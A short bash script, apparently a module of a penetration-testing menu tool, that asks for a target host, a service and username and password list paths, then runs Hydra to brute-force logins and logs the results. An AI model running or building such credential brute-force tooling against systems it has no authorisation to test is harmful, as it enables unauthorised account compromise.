#!/usr/bin/env bash
# Attack module

attack_menu() {
  clear
  cat <<MENU
[ Attack ]
1) Launch Hydra (brute force)
0) Back
MENU
  read -rp "Choose: " attack_choice
  case $attack_choice in
    1) attack_hydra ;;
    0) return ;;
    *) echo "Invalid option"; sleep 1 ;;
  esac
}

attack_hydra() {
  read -rp "Target host: " host
  read -rp "Service (ssh/ftp/etc): " service
  read -rp "Username list path: " users
  read -rp "Password list path: " passwords
  echo "Launching Hydra..."
  hydra -L "$users" -P "$passwords" "$host" "$service" | tee "$LOG_DIR/hydra_${host}.log"
  read -rp "Press enter to continue" _
}
